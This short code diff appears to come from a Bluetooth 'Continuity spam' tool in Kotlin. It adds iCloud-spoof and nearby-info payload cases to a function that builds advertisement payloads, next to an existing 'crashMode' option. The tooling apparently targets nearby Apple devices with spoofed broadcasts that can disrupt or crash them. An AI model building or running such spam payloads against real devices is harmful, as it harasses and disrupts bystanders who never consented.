@@ -54,6 +54,8 @@ class ContinuitySingleSpam(
     private fun buildPayload(device: ContinuityDevice, crashMode: Boolean): ByteArray {
         return when (device.deviceType) {
             ContinuityType.ACTION -> buildNearbyActionPayload(device.value.removePrefix("0x").uppercase(), crashMode)
+            ContinuityType.ICLOUD_SPOOF -> ContinuitySpam.createICloudPayload(device.value)
+            ContinuityType.NEARBY_INFO -> ContinuitySpam.createNearbyInfoPayload(device.value)
             ContinuityType.DEVICE, ContinuityType.NOTYOURDEVICE -> {
                 val deviceVal = device.value.removePrefix("0x").uppercase()
                 val isAirTag = deviceVal == "0055" || deviceVal == "0030"
